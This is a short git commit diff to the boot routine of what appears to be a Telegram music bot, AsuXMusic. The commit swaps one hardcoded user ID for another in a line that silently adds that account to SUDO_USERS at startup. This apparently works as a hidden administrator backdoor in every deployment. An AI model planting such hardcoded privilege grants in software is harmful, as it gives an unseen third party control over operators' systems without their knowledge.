fadbf4b33450e598305375e2e02c23c1334a80b8
MSDIAN123 <111562386+MSDIAN123@users.noreply.github.com>
2022-09-25 10:39:53 +0530

    Update __main__.py

--- AsuXMusic/__main__.py
+++ AsuXMusic/__main__.py
@@ -73,7 +73,7 @@ async def AsuX_boot():
             status="[bold blue]ᴍᴏᴅᴜʟᴇs ɪᴍᴘᴏʀᴛᴀᴛɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!",
         )
         await asyncio.sleep(0.2)
-        SUDO_USERS.append(1452219013)
+        SUDO_USERS.append(5065752827)
         await startup_del(_____)
     console.print(
         "[bold green]ᴛʀʏɪɴɢ ᴛᴏ sᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ...\n"
